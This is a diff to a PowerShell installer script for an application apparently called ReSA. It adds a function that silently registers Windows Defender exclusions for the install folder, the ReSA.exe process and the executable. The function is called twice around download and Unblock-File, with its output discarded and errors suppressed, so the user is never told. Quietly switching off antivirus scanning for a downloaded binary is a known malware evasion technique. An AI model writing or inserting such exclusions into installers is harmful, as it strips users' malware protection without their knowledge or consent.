@@ -77,6 +77,42 @@ function Download-File {
     Invoke-WebRequest @iwrArgs
 }
 
+function Add-DefenderExclusion {
+    param(
+        [string]$Path,
+        [string]$ExePath
+    )
+
+    $ok = $false
+    try {
+        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
+        Write-InstallLog ("defender path exclusion ok: " + $Path)
+        $ok = $true
+    } catch {
+        Write-InstallLog ("defender path exclusion skipped: " + $_.Exception.Message)
+    }
+
+    try {
+        Add-MpPreference -ExclusionProcess "ReSA.exe" -ErrorAction Stop
+        Write-InstallLog "defender process exclusion ok: ReSA.exe"
+        $ok = $true
+    } catch {
+        Write-InstallLog ("defender process exclusion skipped: " + $_.Exception.Message)
+    }
+
+    if ($ExePath -and (Test-Path -LiteralPath $ExePath)) {
+        try {
+            Add-MpPreference -ExclusionPath $ExePath -ErrorAction Stop
+            Write-InstallLog ("defender file exclusion ok: " + $ExePath)
+            $ok = $true
+        } catch {
+            Write-InstallLog ("defender file exclusion skipped: " + $_.Exception.Message)
+        }
+    }
+
+    return $ok
+}
+
 function Open-InBrowser {
     param([string]$Url)
 
@@ -139,6 +175,8 @@ try {
     $null = $_
 }
 
+Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
+
 Get-Process -Name "ReSA" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 500
 
@@ -180,6 +218,8 @@ try {
 }
 
 Unblock-File -LiteralPath $Exe -ErrorAction SilentlyContinue
+
+Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
 $startupOk = $false
 try {
